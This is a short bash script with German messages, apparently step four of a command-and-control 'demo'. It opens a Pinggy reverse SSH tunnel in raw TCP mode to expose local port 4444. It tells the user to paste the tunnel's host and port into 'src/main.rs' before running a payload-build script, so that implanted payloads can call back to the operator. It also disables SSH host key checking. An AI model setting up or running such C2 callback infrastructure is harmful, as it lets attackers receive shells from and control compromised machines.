#!/bin/bash

# ==========================================
#  4. PINGGY TUNNEL (TCP MODE FOR C2)
# ==========================================

GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

print_status() { echo -e "${BLUE}[*] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }

print_status "Starte Pinggy Tunnel für Port 4444 (TCP)..."
print_warning "WICHTIG FÜR DIE DEMO:"
echo "1. Warte, bis die URL erscheint (z.B. tcp://t.pinggy.io:12345)"
echo "2. Kopiere HOST (t.pinggy.io) und PORT (12345) in 'src/main.rs'"
echo "3. Führe DANN erst './build_payloads.sh' aus!"
echo "---------------------------------------------------"

# StrictHostKeyChecking=no verhindert die "Are you sure?" Abfrage
# ServerAliveInterval hält die Verbindung stabil
# tcp@... erzwingt den Raw-TCP Modus (KEIN HTTP!)
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -p 443 -R0:localhost:4444 tcp@a.pinggy.io
